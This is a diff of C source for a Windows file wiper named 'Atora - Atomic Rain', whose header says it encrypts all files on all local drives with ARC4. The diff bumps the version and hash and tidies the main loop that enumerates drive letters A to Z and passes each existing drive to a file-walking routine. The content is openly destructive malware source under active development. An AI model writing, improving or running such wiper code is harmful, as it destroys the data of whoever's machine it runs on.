@@ -1,9 +1,9 @@
 /*
   Name:             Atora - Atomic Rain.
-  Version:          5.21
+  Version:          5.24
   Class:            Files shredder for Windows / Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-256:          e36d8a00daa5243ea8da4836c7b2115df5a797b6f7d1d3540dcb4a8c3839c423
+  SHA-256:          091374a4b40c8d6b3fa74ac598f6593638ada95580281f174f9e6638b6e5e5b8
 */
 #include <io.h>
 #include <time.h>
@@ -42,15 +42,15 @@ unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
 unsigned char data       [_BYTE]        = {_ZERO};
 
 int main (void) {
- short int disk;
+ unsigned char disk;
  time_t real_time;
  unsigned char LOCAL_DISK[] = "+:";
  
  srand(time(&real_time));
 
  for (disk = 65; disk <= 90; disk++) {
-  if (checklogicaldisk((unsigned char)disk) == _ZERO) {
-   LOCAL_DISK[_ZERO] = (unsigned char)disk;
+  if (checklogicaldisk(disk) == _ZERO) {
+   LOCAL_DISK[_ZERO] = disk;
    finddir(LOCAL_DISK, expansion);
   }
  }
